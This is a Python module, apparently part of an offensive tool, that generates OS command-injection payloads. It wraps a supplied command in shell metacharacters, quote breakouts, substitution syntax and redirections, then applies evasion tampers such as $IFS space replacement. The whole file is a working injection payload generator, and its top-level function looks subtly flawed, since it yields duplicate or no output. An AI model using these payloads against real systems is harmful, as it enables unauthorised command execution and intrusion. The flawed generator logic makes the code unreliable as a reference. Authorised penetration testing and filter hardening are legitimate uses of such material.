from typing import Generator, Callable

from raycharles.tampers import *

COMMENT_CHARS = ("#",)

META_CHARS = (
    "&&",
    "||",
    "&",
    "|",
    ";",
)

QUOTE_CHARS = (
    "'",
    '"',
)

SUBSTITUTION_PATTERNS = (
    "$(%(cmd)s)",
    "`%(cmd)s`",
)

ENDINGS = (
    ">/dev/null",
    "2>/dev/null",
)


def _build_payloads(
    cmd: str,
    tampers_patterns: list[list[Callable[[str], str]]],
) -> Generator[str, None, None]:
    for tampers in tampers_patterns:
        for sp in SUBSTITUTION_PATTERNS:
            tampered = sp % {"cmd": cmd}

            yield tampered

            for tamper in tampers:
                tampered = tamper(tampered)

            yield tampered

        for quote in QUOTE_CHARS:
            for meta_chr in META_CHARS:
                tampered = quote + meta_chr + cmd

                yield tampered

                for tamper in tampers:
                    tampered = tamper(tampered)

                yield tampered

                for comment_chr in COMMENT_CHARS:
                    tampered = quote + meta_chr + cmd + comment_chr

                    yield tampered

                    for tamper in tampers:
                        tampered = tamper(tampered)

                    yield tampered

                for end in ENDINGS:
                    tampered = quote + end + meta_chr + cmd

                    yield tampered

                    for tamper in tampers:
                        tampered = tamper(tampered)

                    yield tampered

                    for comment_chr in COMMENT_CHARS:
                        tampered = quote + end + meta_chr + cmd + comment_chr

                        yield tampered

                        for tamper in tampers:
                            tampered = tamper(tampered)

                        yield tampered

        for meta_chr in META_CHARS:
            tampered = meta_chr + cmd

            yield tampered

            for tamper in tampers:
                tampered = tamper(tampered)

            yield tampered

            for comment_chr in COMMENT_CHARS:
                tampered = meta_chr + cmd + comment_chr

                yield tampered

                for tamper in tampers:
                    tampered = tamper(tampered)

                yield tampered

            for end in ENDINGS:
                tampered = end + meta_chr + cmd

                yield tampered

                for tamper in tampers:
                    tampered = tamper(tampered)

                yield tampered

                for comment_chr in COMMENT_CHARS:
                    tampered = end + meta_chr + cmd + comment_chr

                    yield tampered

                    for tamper in tampers:
                        tampered = tamper(tampered)

                    yield tampered


def build_payloads(
    cmd: str,
    tampers_patterns: list[list[Callable[[str], str]]] = [
        [replace_spaces_with_ifs],
        [add_dollar_and_ats],
    ],
) -> Generator[str, None, None]:
    for tampers in tampers_patterns:
        yield from _build_payloads(cmd, tampers_patterns)

        for tamper in tampers:
            cmd = tamper(cmd)

        yield from _build_payloads(cmd, [])
